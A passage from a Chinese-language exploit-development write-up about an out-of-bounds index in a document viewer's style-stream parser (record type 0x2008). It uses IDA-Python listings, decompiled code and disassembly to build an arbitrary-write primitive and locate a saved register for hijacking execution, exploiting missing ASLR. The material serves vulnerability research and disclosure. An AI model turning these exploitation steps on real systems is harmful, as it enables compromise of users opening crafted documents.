[4]  2c+0x4                  int 'field_C'                 (<class 'int'>, 4)
[5]  30+0x4       object_9d0d30* 'p_owner_10'              (<class 'type'>, 4)
[6]  34+0x4                  int 'v_typeField(0)_14'       (<class 'int'>, 4)   # [styleType2008] 0x0
[7]  38+0x4                  int 'v_typeField(1)_18'       (<class 'int'>, 4)   # [styleType2008] 0x1
[8]  3c+0x4                  int 'v_typeField(2)_1c'       (<class 'int'>, 4)   # [styleType2008] 0x2
[9]  40+0x4                  int 'v_typeField(3)_20'       (<class 'int'>, 4)   # [styleType2008] 0x3
[10] 44+0x4                  int 'v_typeField(9)_24'       (<class 'int'>, 4)   # [styleType2008] 9
[11] 48+0x4                  int 'v_typeField(4)_28'       (<class 'int'>, 4)   # [styleType2008] 0x4
[12] 4c+0x8 wstringtoggle_7fb182 'v_typeFieldString(5)_2c' <class 'structure' name='wstringtoggle_7fb182' offset=0x4c size=0x8> # [styleType2008] 5
[13] 54+0x4                  int 'v_typeField(6)_34'       (<class 'int'>, 4)   # [styleType2008] 0x6
[14] 58+0x4                  int 'v_typeField(7)_38'       (<class 'int'>, 4)   # {'styleType2008': 7, 'note': 'writes 4b integer'}
[15] 5c+0x4                  int 'v_typeField(8)_3c'       (<class 'int'>, 4)   # [styleType2008] 0x8
[16] 60+0x4                  int 'field_40'                (<class 'int'>, 4)
[17] 64+0x4     JSFC::SomeString 'v_string_44'             <class 'structure' name='JSFC::SomeString' offset=0x64 size=0x4>
```  
  
  
参考清单，正在写入的每个字段都被命名为  
v_typeField(case)_offset.解析  
0x2008记录类型时，从流中解码的整数将被写入这些字段之一。值得注意的是，  
v_typeField(7)_38case字段7将允许我们写入一个完整的 32 位整数，  
v_typeFieldString(5)_2ccase字段5将允许我们写入一个指向 16 位字符串的指针，而其他字段将允许我们写入一个从 16 位整数进行零扩展的 32 位整数。剩下要做的唯一一件事就是编写一个概念验证，演示用于取消引用指针的越界索引，然后写入我们所需的字段。  
  
  
**缓解措施**  
  
识别漏洞后，我们可以立即检查已应用于目标的缓解措施，以更好地了解哪些因素可能阻碍我们的写入候选者的利用。通过检查地址空间中的模块，我们可以看到 DEP (W^X) 已启用，但 ASLR 不适用于某些列出的模块。这大大简化了事情，因为我们的漏洞允许我们覆盖这些列出的模块中的几乎任何内容。因此，除了写入已知地址来劫持执行之外，我们不需要做太多其他事情。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexa7YMMkONpKcUPiaiaVwdscicHTx1DPlNKfjs1Lhy0qPlhHA8xMYichWaoo69DBGO4MumW3KHETicqwQ/640?wx_fmt=png&from=appmsg "")  
  
在下面的屏幕截图中，我们还注意到目标使用帧指针和堆栈金丝雀来保护它们不被覆盖。这不会直接影响此漏洞的利用，但可能会影响我们在获得执行代码的能力后最终重新利用的任何代码。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexa7YMMkONpKcUPiaiaVwdscK7p5nAbtodG5mAk9Vs8wFuibaYC3mVPXdnjkokAibibdBnFicSmicoS4WfA/640?wx_fmt=png&from=appmsg "")  
  
  
**利用漏洞**  
  
现在我们已经确定了任何可能增加我们目标复杂性的因素，我们可以重新审视该漏洞并对其进行扩展。我们需要做的第一件事是控制将被取消引用的指针。我们的指针将位于堆栈上，因此我们需要获取应用程序从流中解析的数据并将其放置在堆栈上，以便我们可以使用越界索引来取消引用它。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexa7YMMkONpKcUPiaiaVwdscylvrsDicKtRXDPxB7zLibjebIkPiaZ5pHB1TuagicTDYpgsicyrxMeOJfyw/640?wx_fmt=png&from=appmsg "")  
  
检查该漏洞的范围表明，从文档开始解析 文档中的流时起，它的调用堆栈深度为 3   
object_9c2044::method_processStreams_77af0f。该深度代表应用程序中我们控制输入的部分，并包含我们可以通过文档影响应用程序的逻辑。从文件中读取的任何数据只能从此范围内的方法之一获得。  
  
```
int __thiscall object_9c2044::method_processStreams_77af0f(
        object_9c2044 *this,
        JSVDA::object_OFRM *ap_oframe_0,
        unsigned int av_documentType_4,
        unsigned int av_flags_8,
        struc_79aa9a *ap_stackobject_c,
        int ap_null_10)
{
...
  lp_oframe_230 = ap_oframe_0;
  lp_stackObject_234 = ap_stackobject_c;
...
  if ( !lv_struc_24c.lv_flags_10 )
  {
LABEL_42:
    lv_struc_24c.field_14 = av_flags_8 & 0x800;
    v10 = object_9c2044::parseStream(DocumentViewStyles)_3a790a(this, ap_oframe_0, av_documentType_4, av_flags_8);          // "DocumentViewStyles"
    if ( v10 == 1 )
    {
      v10 = object_9c2044::parseStream(DocumentEditStyles)_3a6cb2(this, lp_oframe_230, av_documentType_4, av_flags_8);      // "DocumentEditStyles"
      if ( v10 == 1 )
      {
        v10 = object_10cbd2::processSomeStreams_778971(
                this->v_data_290.p_object_48,
                lp_oframe_230,
                av_documentType_4,
                av_flags_8);
        if ( v10 == 1 )
        {
...
          v10 = object_9c2044::decode_substream(Toolbox)_3a6a7b(this, lp_oframe_230);                                       // "Toolbox"
          if ( v10 == 1 )
          {
            v10 = object_9c2044::decode_stream(DocumentMacro)_3a680a(this, lp_oframe_230, av_documentType_4);               // "DocumentMacro"
            if ( v10 == 1 )
            {
              v10 = sub_3BE25803(this, lp_oframe_230, av_flags_8);
              if ( v10 == 1 )
              {
                v10 = JSVDA::object_OFRM::decode_stream(Vision_Sidenote)_77310e(this, lp_oframe_230);                       // "Vision_Sidenote"
                if ( v10 == 1 )
                {
                  v10 = object_9c2044::decode_stream(MergeDataName)_3a55d3(this, lp_oframe_230);                            // "MergeDataName"
                  if ( v10 == 1 )
                  {
                    v10 = object_9c2044::decode_stream(HtmlAdditionalData)_3a5445(this, lp_oframe_230, av_documentType_4, lp_stackObject_234, 0);
...
                  }
                }
              }
            }
          }
        }
      }
    }
...
  }
  return v10;
}
 
/** Functions used to parse both the "DocumentViewStyles" and "DocumentEditStyles" streams. **/
int __thiscall object_9c2044::parseStream(DocumentViewStyles)_3a790a(object_9c2044 *this, JSVDA::object_OFRM *ap_oframe_0, int av_documentType_4, int av_flags_8)
{
  object_9c2d50::field_397a8d::clear_3a7b8b(this->v_data_290.p_object_84->v_data_4.p_streamContentsField_1dc);
  this->v_data_290.p_object_84->v_data_4.p_streamContentsField_1dc = 0;
  return object_9c2044::parseStream(DocumentViewStyles,DocumentEditStyles)_3a76be(this, ap_oframe_0, av_documentType_4, av_flags_8, 1, 0);
}
 
int __thiscall object_9c2044::parseStream(DocumentEditStyles)_3a6cb2(object_9c2044 *this, JSVDA::object_OFRM *ap_oframe_0, int av_documentType_4, int av_flags_8)
{
  object_9c2d50::field_397a8d::clear_3a7b8b(this->v_data_290.p_object_84->v_data_4.p_streamContentsField_1d8);
  this->v_data_290.p_object_84->v_data_4.p_streamContentsField_1d8 = 0;
  return object_9c2044::parseStream(DocumentViewStyles,DocumentEditStyles)_3a76be(this, ap_oframe_0, av_documentType_4, av_flags_8, 2, 0);
}
```  
  
  
粗略地看一下  
object_9c2044::method_processStreams_77af0f清单中的方法，似乎感兴趣的流是应用程序正在解析的前两个流之一。这意味着在打开文档和到达我们的漏洞之间没有执行太多逻辑。为了影响漏洞出现之前的应用程序状态，我们仅限于与解析包含文档样式的流相关的逻辑。如果我们最终在漏洞范围内的任何时间劫持执行，我们将需要某种方法来维护控制权，以修改我们计划加载的任何页面的权限。  
  
  
探索其他一些流解析器似乎表明某些对象调用虚拟方法来从流中读取数据。它们存在于某些可用模块的可写部分中，因此如果我们确定有必要，我们可以全局覆盖它们。但是，这也会导致整个应用程序的该功能“中断”，因为虚拟方法将不再可用。  
  
  
由于我们的写入发生在应用程序解析文档的开始时，因此我们覆盖的任何内容都必须由从文件读取数据的一两个流使用。对属于 和  
DocumentViewStyles 流的记录类型的解析器执行基本查询  
DocumentEditStyles表明，没有任何内容被动态读取到堆或任何其他方式中，因此我们必须利用我们的漏洞来写入整个有效负载和其他任何内容我们可能需要。  
  
```
Python> func.frame(0x3BE11906).members
<class 'structure' name='$ F3BE11906' offset=-0xcc size=0xe4>
     -cc+0x10                                          [None, 16]
[0]  -bc+0x4                  int 'var_B4'             (<class 'int'>, 4)
[1]  -b8+0x4                  int 'var_B0'             (<class 'int'>, 4)
[2]  -b4+0x2              __int16 'var_AC'             (<class 'int'>, 2)
...
[13] -8d+0x1                 char 'lvb_85'             (<class 'int'>, 1)
[14] -8c+0x2              __int16 'lvw_case_84'        (<class 'int'>, 2)
     -8a+0x2                                           [None, 2]
[15] -88+0xc         arena_reader 'lv_triple_80'       <class 'structure' name='arena_reader' offset=-0x88 size=0xc>
[16] -7c+0x4                  int 'lv_size_74'         (<class 'int'>, 4)
[17] -78+0x2              __int16 'lvw_index_70'       (<class 'int'>, 2)
[18] -76+0x2              __int16 'var_6E'             (<class 'int'>, 2)
[19] -74+0x18   object_9d15a0*[6] 'lv_objects(6)_6c'   [(<class 'type'>, 4), 6]
[20] -5c+0x50         wchar_t[40] 'lv_wstring(28)_54'  [(<class 'int'>, 2), 40]
[21]  -c+0x4                  int 'var_4'              (<class 'int'>, 4)
[22]  -8+0x4              char[4] ' s'                 [(<class 'int'>, 1), 4]
[23]  -4+0x4              char[4] ' r'                 [(<class 'int'>, 1), 4]
[24]   0+0x4  JSVDA::object_OSEG* 'ap_oseg_0'          (<class 'type'>, 4)
[25]   4+0x4                  int 'av_size_4'          (<class 'int'>, 4)
[26]   8+0x4                  int 'av_someFlag_8'      (<class 'int'>, 4)
[27]   c+0x4                  int 'av_documentType_c'  (<class 'int'>, 4)
[28]  10+0x4                  int 'ap_nullobject_10'   (<class 'int'>, 4)
[29]  14+0x4                 int* 'ap_unusedResult_14' (<class 'type'>, 4)
```  
  
  
此清单显示了属于包含我们的漏洞的方法的整个框架的布局  
object_9d0d30::readStyleType(2008)_391906。在此布局中，该  
lv_objects(6)_6c字段包含与索引一起使用的六元素指针数组。这意味着我们将取消引用相对于该数组的指针。该数组之后是金丝雀之前的缓冲区，保护调用者的帧指针和地址。如果我们交叉引用这个字段，我们可以看到它在 case 的处理过程中被引用  
5。   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexa7YMMkONpKcUPiaiaVwdscyWsiaq2gqmicPJEbib0wGDicliaHDkAzEicVupV8YPs65eAPBGatqEnEYhPA/640?wx_fmt=png&from=appmsg "")  
  
在情况 中5，实现将读取两个 16 位字段，其中包含索引和大小。  
0x66在用于将 16 位整数数组读入所引用的字节大小缓冲区之前，会根据常量检查该大小  
0x50。检查后  
0x66，将大小对齐到 2 的倍数，然后验证它是否小于  
0x42。如果这次长度验证失败，  
__report_rangecheckfailure函数将立即终止执行。  
  
  
如果通过此检查，则读取的数组将用于构造前面提到的短对象，然后写入位于堆栈上的六个对象的数组。该函数中没有其他代码使用这个 16 位整数数组，并且由于它用于临时存储从文件中读取的 16 位整数数组，因此我们可以重用它的空间来存储我们想要的任何指针在开发过程中使用。  
  
  
**漏洞的能力**  
  
回到概念验证，我们需要将提到的两种情况结合起来进行记录0x2008，以便我们可以发出必要的记录以写入任意地址。 Case5允许我们将 16 位整数数组存储到缓冲区中，因此我们将使用它来存储将取消引用该  
lv_wstring(28)_54字段的指针。 Case7允许我们指定一个越界索引，因此我们可以指定一个索引，该索引将从  
lv_wstring(28)_54我们加载的字段中取消引用指针  
case 5。这两种类型的组合允许我们将受控的 32 位整数写入受控的地址。  
  
  
由于我们范围的限制，由于该漏洞位于正在解析的文档的最开头，因此我们受到限制，因为我们必须使用该漏洞在应用程序的地址空间中加载整个有效负载。这意味着我们需要将对任意地址的原语 32 位写入提升为允许我们将任意数量的数据写入任意地址的原语。如果我们使用相同的技术，即一条类型为 的记录5后跟一条类型为 的记录7，则这将导致由  
type、  
size和组成的 6 个字节的大小成本  
index，后跟 32 位整数或地址（10总共字节） 。由于正在使用两种记录类型，因此20我们希望写入的每个 32 位整数的开销将为字节。幸运的是，由于字段中有更多空间  
lv_wstring(28)_54可以用来存储需要写入的每个地址，因此可以减少这种开销。  
  
  
之前大小的上限  
__report_rangecheckfailure是  
0x42字节，我们需要在字符串开头为空终止符添加额外的空间。这将允许我们使用字节为每个类型 5 记录加载 15 个地址  
0x46。然后对每个要写入的整数使用类型  
7记录将导致  
10每个 32 位整数的成本为字节，这是一种改进。为了容纳不是 的倍数的数据量  
4，我们只需在末尾写入一个未对齐的 32 位整数作为额外字节，然后按照所述填充之前的空间。在我们的漏洞利用中实现这些抽象之后，下一步是找出要劫持的内容。  
  
  
**劫持执行**  
  
由于我们可以在地址空间内的任何位置写入，因此我们可以覆盖一些全局指针来劫持执行。但是，如果我们检查直接范围内和周围的代码，则唯一可用于劫持的虚拟方法仅用于读取正在解析的当前流的内容。如果我们检查这些对象的内容，就会发现它们内部绝对不包含有用的数据，甚至不包含可能允许我们破坏应用程序其他部分的指针。因此，我们需要希望我们可以用流的内容影响的东西驻留在内存中的可预测位置。   
  
```
Python> struc.by('JSVDA::object_OSEG')
<class 'structure' name='JSVDA::object_OSEG' size=0x10>         # [alloc.tag] OSEG
 
Python> struc.by('JSVDA::object_OSEG').members
<class 'structure' name='JSVDA::object_OSEG' size=0x10>         # [alloc.tag] OSEG
[0]  0+0x4               int 'p_vftable_0' (<class 'int'>, 4)   # [vftable] 0x27818738
[1]  4+0xc object_OSEG::data 'v_data_4'    <class 'structure' name='object_OSEG::data' offset=0x4 size=0xc>
 
Python> struc.by('JSVDA::object_OSEG').members[1].type.members
<class 'structure' name='object_OSEG::data' offset=0x4 size=0xc>
[0]  4+0x4     int 'v_bucketIndex_0'    (<class 'int'>, 4)
[1]  8+0x8 __int64 'v_currentOffset?_4' (<class 'int'>, 8)
```  
  
  
此列表显示了用于从流中读取数据的对象的布局。如所列，该对象只有一个字段，即文档的索引或句柄。由于缺少 ASLR，我们可以覆盖该对象引用的虚拟方法表之一。但是，应用程序从该对象使用的唯一方法由同一记录实现用来解析它。我们覆盖的任何内容都会立即破坏该对象并阻止应用程序从文档加载更多数据。  
  
  
检查堆栈还表明，除了指向静态初始化并因此作用于应用程序的全局对象的指针之外，没有任何有用的指针。然而，堆栈上有可以使用的帧指针。我们只需要找到一个相对引用即可使用它。由于代码执行方式的性质，我们可以假设漏洞上下文中的所有内容都源自堆栈上方的调用者。因此，它要么从属于另一个组件的堆中复制出来，通过某种全局状态进入我们的作用域，要么作为参数进入作用域。我们还需要记住，我们只能在 处写入 32 位整数，在和+0x58之间写入 16 位整数，或者指向包含相对于我们选择的指针的字符串的结构的指针。因此，我们需要搜索以找到对框架的引用，该框架允许我们在这些约束内劫持执行。   
+0x34+0x60+0x4C  
  
  
如果我们在触发漏洞时捕获调用堆栈，则可以捕获每个帧的布局，并使用它来识别用于  
+0x58case7或  
+0x4C - 4用于 case 的任何字段  
5。  
  
```
Python> callstack = [0x3be11d03, 0x3be27501, 0x3be278b2, 0x3be2793e, 0x3c1fb083, 0x3c1fb495, 0x3c1fb4ef, 0x3be2795d]
Python> list(map(function.address, callstack))
[0x3be11906, 0x3be27048, 0x3be276be, 0x3be2790a, 0x3c1faf0f, 0x3c1fb3ed, 0x3c1fb4ab, 0x3be27954]
 
# Exchange each address in the backtrace with the function that owns it.
Python> functions = list(map(function.address, callstack))
Python> pp(list(map(function.name, functions)))
['object_9d0d30::readStyleType(2008)_391906',
 'struc_3a9de4::parseStylesContent_3a7048',
 'object_9c2044::parseStream(DocumentViewStyles,DocumentEditStyles)_3a76be',
 'object_9c2044::parseStream(DocumentViewStyles)_3a790a',
 'object_9c2044::method_processStreams_77af0f',
 'object_9c2044::vmethod_processStreamsTwice_77b3ed',
 'object_9e9d90::processDocumentByType_77b4ab',
 'sub_3BE27954']
 
# Grab the frame for each function and align them contiguously.
Python> frames = list(map(func.frame, functions))
Python> contiguous = struc.right(frames[-1], frames[-1:])
 
# Display all frame pointers along with the offset needed to overwrite them.
Python> for frame in contiguous: print("{:#x} : {}".format(frame.byname(' s').offset - 0x58, frame.byname(' s')))
-0x640 : <member '$ F3BE11906. s' index=22 offset=-0x5e8 size=+0x4 typeinfo='char[4]'>
-0x608 : <member '$ F3BE27048. s' index=3 offset=-0x5b0 size=+0x4 typeinfo='char[4]'>
-0x55c : <member '$ F3BE276BE. s' index=25 offset=-0x504 size=+0x4 typeinfo='char[4]'>
-0x53c : <member '$ F3BE2790A. s' index=0 offset=-0x4e4 size=+0x4 typeinfo='char[4]'>
-0x2cc : <member '$ F3C1FAF0F. s' index=9 offset=-0x274 size=+0x4 typeinfo='char[4]'>
-0x9c : <member '$ F3C1FB3ED. s' index=3 offset=-0x44 size=+0x4 typeinfo='char[4]'>
-0x78 : <member '$ F3C1FB4AB. s' index=0 offset=-0x20 size=+0x4 typeinfo='char[4]'>
-0x60 : <member '$ F3BE27954. s' index=0 offset=-0x8 size=+0x4 typeinfo='char[4]'>
 
# Gather them into a set.
Python> offsets = set(item.byname(' s').offset - 0x58 for item in contiguous)
 
# Display each frame and any of its members that contain one of the determined offsets.
Python> for frame in contiguous: print(frame), frame.members.list(offset=offsets), print()
<class 'structure' name='$ F3BE11906' offset=-0x6ac size=0xe4>
[20] -63c+0x50         wchar_t[40] 'lv_wstring(28)_54'  [(<class 'int'>, 2), 40]
 
<class 'structure' name='$ F3BE27048' offset=-0x5c8 size=0x38>
 
<class 'structure' name='$ F3BE276BE' offset=-0x590 size=0xa8>
[12] -55c:+0x4           int 'var_58'      (<class 'int'>, 4)
[20] -53c:+0x28 struc_3a9de4 'lv_struc_38' <class 'structure' name='struc_3a9de4' offset=-0x53c size=0x28>  # [note] Wanted object
 
<class 'structure' name='$ F3BE2790A' offset=-0x4e8 size=0x18>
 
<class 'structure' name='$ F3C1FAF0F' offset=-0x4d0 size=0x278>
[7]  -4a0+0x228           object_2f27f8 'lv_object_22c'      <class 'structure' name='object_2f27f8' offset=-0x4a0 size=0x228>
 
<class 'structure' name='$ F3C1FB3ED' offset=-0x258 size=0x230>
[1] -248+0x200        wchar_t[256] 'lv_wstring_204'    [(<class 'int'>, 2), 256]
 
<class 'structure' name='$ F3C1FB4AB' offset=-0x28 size=0x20>
 
<class 'structure' name='$ F3BE27954' offset=-0x8 size=0x18>
```  
  
  
从这个列表中，我们只有五个结果，其中只有两个似乎指向可以引用的字段。这个结果数量足够小，足以手动验证，并且我们发现从帧指针  
lv_struc_38开始的字段 非常适合我们的 32 位写入。该字段属于名为 的方法所在的  
0x58函数的框架。检查此方法调用的函数的原型表明该对象似乎仅由单个方法使用。  
0x3BE276BEobject_9c2044::parseStream(DocumentViewStyles,DocumentEditStyles)_3a76be  
  
```
# Grab all of the calls for function 0x3BE276BE that do not use a register as its operand.
Python> calls = {ins.op_ref(ref) for ref in function.calls(0x3BE276BE) if not isinstance(ins.op(ref), register_t)}
 
# List all functions that we selected.
Python> db.functions.list(typed=True, ea=calls)
[0]  +0x109b2a : 0x3bb89b2a..0x3bb89b9e : (1) FvD+ : __thiscall object_10cbd2::get_field(3c)_109b2a          : lvars:1c args:2 refs:100  exits:1
[1]  +0x1329ce : 0x3bbb29ce..0x3bbb29e8 : (1) Fvt+ :    __cdecl object_OSEG::setCurrentStreamPosition_1329ce : lvars:00 args:5 refs:182  exits:1
[2]  +0x132a07 : 0x3bbb2a07..0x3bbb2a15 : (1) Fvt+ :    __cdecl object_OSEG::destroy_132a07                  : lvars:00 args:1 refs:270  exits:1
[3]  +0x132de4 : 0x3bbb2de4..0x3bbb2e41 : (1) FvT+ :    __cdecl object_OFRM::openStreamByName?_132de4        : lvars:08 args:4 refs:144  exits:1
[4]  +0x1a9adb : 0x3bc29adb..0x3bc29bff : (1) FvD+ : __thiscall sub_3BC29ADB                                 : lvars:68 args:1 refs:7    exits:1
[5]  +0x1cbf85 : 0x3bc4bf85..0x3bc4c3f2 : (1) FvD+ : __thiscall sub_3BC4BF85                                 : lvars:6c args:2 refs:6    exits:1
[6]  +0x1d5697 : 0x3bc55697..0x3bc558b7 : (1) FvD+ : __thiscall object_9bd120::method_1d5697                 : lvars:8c args:1 refs:6    exits:1
[7]  +0x2198ca : 0x3bc998ca..0x3bc9998f : (1) FvD+ : __thiscall sub_3BC998CA                                 : lvars:28 args:4 refs:38   exits:1
[8]  +0x3a7048 : 0x3be27048..0x3be27664 : (1) FvT+ : __thiscall struc_3a9de4::parseStylesContent_3a7048      : lvars:18 args:7 refs:2    exits:1
[9]  +0x3a7664 : 0x3be27664..0x3be276be : (1) FvT+ :    __cdecl object_OSEG::read_ushort_3a7664              : lvars:1c args:2 refs:90   exits:1
[10] +0x3a9547 : 0x3be29547..0x3be2955d : (1) FvD+ : __thiscall sub_3BE29547                                 : lvars:00 args:3 refs:5    exits:1
[11] +0x3a9638 : 0x3be29638..0x3be2963b : (1) FvD+ :  __unknown return_3a9638                                : lvars:00 args:0 refs:30   exits:1
[12] +0x3a9de4 : 0x3be29de4..0x3be29e05 : (1) FvD* : __thiscall constructor_3a9de4                           : lvars:00 args:1 refs:7    exits:1
[13] +0x7b15a6 : 0x3c2315a6..0x3c23161a : (1) FvD+ : __thiscall object_10cbd2::get_field(38)_7b15a6          : lvars:1c args:2 refs:36   exits:1
[14] +0x7b9e07 : 0x3c239e07..0x3c239e7c : (1) FvD+ : __thiscall object_10cbd2::get_field(34)_7b9e07          : lvars:1c args:2 refs:98   exits:1
[15] +0x8ea4fd : 0x3c36a4fd..0x3c36a50e : (1) LvD+ :  __unknown __EH_epilog3_GS                              : lvars:00 args:0 refs:2546 exits:0
 
# Grab all our results that are typed, and emit their prototype.
Python> for ea in db.functions(tag='__typeinfo__', ea=calls): print(function.tag(ea, '__typeinfo__'))
object_9bd184 *__thiscall object_10cbd2::get_field(3c)_109b2a(object_10cbd2 *this, __int16 avw_0)
int __cdecl object_OSEG::setCurrentStreamPosition_1329ce(JSVDA::object_OSEG *ap_oseg_0, int av_low_4, int av_high_8, int av_reset?_c, __int64 *ap_resultOffset_10)
int __cdecl object_OSEG::destroy_132a07(JSVDA::object_OSEG *ap_oseg_0)
int __cdecl object_OFRM::openStreamByName?_132de4(JSVDA::object_OFRM *ap_oframe_0, char *ap_streamName_4, int av_flags_8, JSVDA::object_OSEG **)
int __thiscall sub_3BC29ADB(object_9bd0e4 *this)
int __thiscall sub_3BC4BF85(object_9bd184 *this, int a2)
int __thiscall object_9bd120::method_1d5697(object_9bd120 *this)
int __thiscall sub_3BC998CA(object_9bd0e4 *this, int av_length_0, int av_field_4, int av_neg1_8)
int __thiscall struc_3a9de4::parseStylesContent_3a7048(struc_3a9de4 *this, JSVDA::object_OSEG *ap_oseg_0, int av_position(lo)_4, int av_position(hi)_8, int av_currentStreamState?_c, frame_3a7048_arg_10 ap_unkobjectunion_10, frame_3a7048_arg_14 ap_nullunion_14)
int __cdecl object_OSEG::read_ushort_3a7664(JSVDA::object_OSEG *ap_this_0, _WORD *ap_result_4)
_DWORD *__thiscall sub_3BE29547(_DWORD *this, __int16 arg_0, int arg_4)
void return_3a9638()
struc_3a9de4 *__thiscall constructor_3a9de4(struc_3a9de4 *this)
object_9bd120 *__thiscall object_10cbd2::get_field(38)_7b15a6(object_10cbd2 *this, __int16 avw_noCreate_0)
object_9bd0e4 *__thiscall object_10cbd2::get_field(34)_7b9e07(object_10cbd2 *this, __int16)
void __EH_epilog3_GS)
 
# Only this prototype references our object as its "this" parameter.
int __thiscall struc_3a9de4::parseStylesContent_3a7048(struc_3a9de4 *this, JSVDA::object_OSEG *ap_oseg_0, int av_position(lo)_4, int av_position(hi)_8, int av_currentStreamState?_c, frame_3a7048_arg_10 ap_unkobjectunion_10, frame_3a7048_arg_14 ap_nullunion_14)
```  
  
  
从清单中的结果来看，该方法似乎struc_3a9de4::parseStylesContent_3a7048引用了我们所需的类型作为其this参数。在检查该  
struc_3a9de4::parseStylesContent_3a7048方法期间， 表示的对象this存储在  
%edi寄存器中。我们现在的目标是通过直接引用或通过  
%edi此方法的寄存器来找到指向此结构的指针。为了找到候选者，我们可以手动从调用堆栈中遍历并枚举使用该类型的所有位置，或者我们可以使用调试器来监视引用结构内任何内容的位置。幸运的是，我们的搜索空间相对较小，我们可以在下面的列表中轻松找到它。  
  
```
.text:3BE27048 000                 push    ebp
.text:3BE27049 004                 mov     ebp, esp
.text:3BE2704B 004                 sub     esp, 0Ch
.text:3BE2704E 010                 and     [ebp+lv_result_4], 0
.text:3BE27052 010                 push    ebx
.text:3BE27053 014                 mov     ebx, [ebp+ap_oseg_0]                             ; parameter: struc_3a9de4 *this
...
.text:3BE274D4     loc_3BE274D4:
.text:3BE274D4 01C                 mov     ecx, [ecx+object_9c2044.v_data_290.p_object_84]
.text:3BE274DA 01C                 mov     eax, [ecx+object_9c2d50.v_data_4.p_object_60]
.text:3BE274DD 01C                 test    eax, eax
.text:3BE274DF 01C                 jnz     short loc_3BE274EE
.text:3BE274E1 01C                 call    object_9c2d50::create_field(64)_6bf3a6
.text:3BE274E6 01C                 test    eax, eax
.text:3BE274E8 01C                 jz      loc_3BE27625
.text:3BE274EE
.text:3BE274EE     loc_3BE274EE:
.text:3BE274EE 01C                 lea     ecx, [ebp+lv_result_4]
.text:3BE274F1 01C                 push    ecx
.text:3BE274F2 020                 push    dword ptr [ebp+ap_unkobjectunion_10]
.text:3BE274F5 024                 mov     ecx, eax
.text:3BE274F7 024                 push    [edi+struc_3a9de4.v_documentType_8]
.text:3BE274FA 028                 push    [ebp+ap_oseg_0]
.text:3BE274FD 02C                 push    [edi+struc_3a9de4.v_header_long_4]
.text:3BE27500 030                 push    ebx                                              ; pushed onto stack
.text:3BE27501 034                 call    object_9d0d30::readStyleType(2008)_391906
.text:3BE27506 01C                 jmp     loc_3BE2736F
```  
  
  
如果我们检查 的调用者  
object_9d0d30::readStyleType(2008)_391906，并从它向后遍历，我们遇到的第一个调用指令将调用名为 的方法  
object_9c2d50::create_field(64)_6bf3a6。该方法也会在字段  
object_9c2d50::v_data_4::p_object_60初始化为零的条件下调用。从包含方法的开头到有条件调用的方法的相关路径如前面的列表所示。  
  
  
由于 和  
object_9c2d50::create_field(64)_6bf3a6函数  
object_9d0d30::readStyleType(2008)_391906均由同一函数调用，因此它们的帧保证重叠。我们的目标是%edi通过从方法中执行广度优先搜索  
struc_3a9de4::parseStylesContent_3a7048并使用结果构建可以过滤的候选调用堆栈列表来识别将寄存器保留为其序言一部分的函数。  
  
  
以下清单结合了漏洞范围内的调用堆栈，以确定过滤结果时要使用的候选范围。在此列表中，范围是从  
-0xAC到  
-0x58。通过将此过滤器应用于我们的候选者，我们发现函数的序言  
0x3BDFD8F8存储了此范围内的多个寄存器。这些寄存器之一是我们想要的  
%edi寄存器，它在我们的列表中处于偏移位置  
-0xA4。这与  
lv_wstring(28)_54属于我们的易受攻击函数框架的字段重叠。  
  
```
# Assign the callstacks that we will be comparing.
callstack_for_vulnerability =                           [0x3be11906, 0x3be27048]
callstack_for_conditional =     [0x3c36a51f, 0x3bdfd8f8, 0x3c13f3a6, 0x3be27048]
 
# Print out the first layout (right-aligned to offset 0).
Python> [frame.members for frame in struc.right(0, map(function.frame, callstack_for_vulnerability))]
[<class 'structure' name='$ F3BE11906' offset=-0x11c size=0xe4>
     -11c+0x10                                          [None, 16]
[0]  -10c+0x4                  int 'var_B4'             (<class 'int'>, 4)
[1]  -108+0x4                  int 'var_B0'             (<class 'int'>, 4)
[2]  -104+0x2              __int16 'var_AC'             (<class 'int'>, 2)
...
[8]   -c+0x4                 int 'av_currentStreamState?_c' (<class 'int'>, 4)      # [note] usually 2, and seems to be only used during function exit
[9]   -8+0x4 frame_3a7048_arg_10 'ap_unkobjectunion_10'     <class 'union' name='frame_3a7048_arg_10' offset=-0x8 size=0x4>
[10]  -4+0x4 frame_3a7048_arg_14 'ap_boxunion_14'           <class 'union' name='frame_3a7048_arg_14' offset=-0x4 size=0x4>] # [note] used by types 0x2008 and 0x2010
 
# Print out the second layout (right-aligned to offset 0).
Python> [frame.members for frame in struc.right(0, map(function.frame, callstack_for_conditional)))]
[<class 'structure' name='$ F3C36A51F' offset=-0x98 size=0x8>
[0] -98+0x4 char[4] ' r'    [(<class 'int'>, 1), 4]
[1] -94+0x4     int 'arg_0' (<class 'int'>, 4), <class 'structure' name='$ F3BDFD8F8' offset=-0x90 size=0x30>
    -90+0x10                      [None, 16]
[0] -80+0x4      int 'var_10'     (<class 'int'>, 4)
...
[5]  -18+0x4 JSVDA::object_OSEG* 'ap_oseg_0'                (<class 'type'>, 4)
[6]  -14+0x4                 int 'av_position(lo)_4'        (<class 'int'>, 4)
[7]  -10+0x4                 int 'av_position(hi)_8'        (<class 'int'>, 4)
[8]   -c+0x4                 int 'av_currentStreamState?_c' (<class 'int'>, 4)      # [note] usually 2, and seems to be only used during function exit
[9]   -8+0x4 frame_3a7048_arg_10 'ap_unkobjectunion_10'     <class 'union' name='frame_3a7048_arg_10' offset=-0x8 size=0x4>
[10]  -4+0x4 frame_3a7048_arg_14 'ap_boxunion_14'           <class 'union' name='frame_3a7048_arg_14' offset=-0x4 size=0x4>] # [note] used by types 0x2008 and 0x2010
 
# Emit the members from the vulnerability's backtrace that are worth dereferencing.
Python> [frame.members.list(bounds=(-0xc4, -0x58)) for frame in struc.right(0, map(function.frame, callstack_for_vulnerability))]
[19] -c4:+0x18 object_9d15a0*[6] 'lv_objects(6)_6c'  [(<class 'type'>, 4), 6]
[20] -ac:+0x50       wchar_t[40] 'lv_wstring(28)_54' [(<class 'int'>, 2), 40]
[21] -5c:+0x4                int 'var_4'             (<class 'int'>, 4)
 
# Emit the members within the other backtrace that overlaps "lv_wstring(28)_54".."var_4".
Python> [frame.members.list(bounds=(-0xac, -0x58)) for frame in struc.right(0, map(function.frame, callstack_for_conditional))]
[2] -ac:+0x4     int 'var_14'        (<class 'int'>, 4)
